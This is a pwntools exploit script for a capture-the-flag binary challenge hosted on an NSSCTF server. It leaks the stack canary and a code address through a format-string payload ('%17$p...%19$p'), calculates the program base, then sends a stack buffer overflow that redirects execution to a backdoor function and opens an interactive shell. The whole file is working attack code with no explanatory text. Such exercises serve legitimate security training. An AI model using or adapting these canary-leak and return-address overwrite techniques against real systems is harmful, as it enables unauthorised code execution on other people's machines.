from pwn import *
context(arch='amd64',os='linux',log_level='debug')
elf=ELF('./pwn')
p=remote("node4.anna.nssctf.cn",22908)
# p=process('./pwn')

# canary地址计算:(0x60-8)/8=11  11+6=17
payload=b'%17$paaa%19$p'

p.sendlineafter("Hi! What's your name? ",payload)

buf=p.recvuntil('!').decode()[:-1]
tmp=buf.split(" ")[4].split("aaa")[0]
canary=int(tmp,16)
log.info(tmp)
tmp=buf.split(" ")[4].split("aaa")[1]
log.info(tmp)
rip_addr=int(tmp,16)
base_addr=rip_addr-0x146f
black_door=base_addr+0x122e
payload=flat([b'a'*(0x40-8),canary,b'a'*8,black_door])
p.sendlineafter("else? ",payload)
p.interactive()
